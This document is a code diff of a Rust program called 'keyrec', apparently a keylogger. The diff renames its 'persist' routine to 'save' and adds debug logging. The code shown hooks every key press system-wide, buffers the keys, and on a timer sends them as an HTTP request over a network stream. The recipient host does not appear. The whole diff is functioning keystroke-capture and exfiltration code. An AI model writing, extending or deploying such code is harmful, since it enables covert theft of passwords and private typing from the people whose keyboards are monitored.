@@ -17,14 +17,13 @@ use std::{
 };
 
 pub const NAME: &str = "keyrec";
-pub const KEYS_PERSIST_INTERVAL_IN_MS: &str = env!("KEYS_PERSIST_INTERVAL_IN_MS");
+pub const KEYS_SAVE_INTERVAL_IN_MS: &str = env!("KEYS_SAVE_INTERVAL_IN_MS");
 
 // TODO: implement without static
 pub static TYPED_KEYS: Lazy<Arc<Mutex<Vec<String>>>> = Lazy::new(|| Arc::new(Mutex::new(vec![])));
 
 fn main() {
-  let keys_persist_interval =
-    Duration::from_millis(KEYS_PERSIST_INTERVAL_IN_MS.parse::<u64>().unwrap());
+  let keys_save_interval = Duration::from_millis(KEYS_SAVE_INTERVAL_IN_MS.parse::<u64>().unwrap());
 
   match setup(&NAME) {
     Ok(_) => {}
@@ -36,16 +35,16 @@ fn main() {
 
   let keys = Arc::clone(&TYPED_KEYS);
   thread::spawn(move || loop {
-    thread::sleep(keys_persist_interval);
+    thread::sleep(keys_save_interval);
 
     let mut keys = keys.lock().unwrap();
     let keys_cloned = keys.clone();
     keys.clear();
 
-    match persist(keys_cloned) {
+    match save(keys_cloned) {
       Ok(_) => {}
       Err(err) => {
-        debug!("Unable to persist keys - {:?}.", err);
+        debug!("Unable to save keys - {:?}.", err);
       }
     }
   });
@@ -55,8 +54,11 @@ fn main() {
   }
 }
 
-fn persist(keys: Vec<String>) -> Result<()> {
+fn save(keys: Vec<String>) -> Result<()> {
+  debug!("Saving keys with len - {}...", keys.len());
+
   if keys.is_empty() {
+    debug!("Skip saving.");
     return Ok(());
   }
 
@@ -84,12 +86,15 @@ fn persist(keys: Vec<String>) -> Result<()> {
   stream.write_buf(headers.as_bytes())?;
   stream.write_buf(body.as_bytes())?;
 
+  debug!("Done saving keys with len - {}.", keys.len());
+
   Ok(())
 }
 
 fn callback(event: Event) {
   match event.event_type {
     EventType::KeyPress(key) => {
+      debug!("KeyPress:\"{:?}\" fired.", key);
       let mut keys = TYPED_KEYS.lock().unwrap();
       keys.push(format!("{:?}", key));
     }
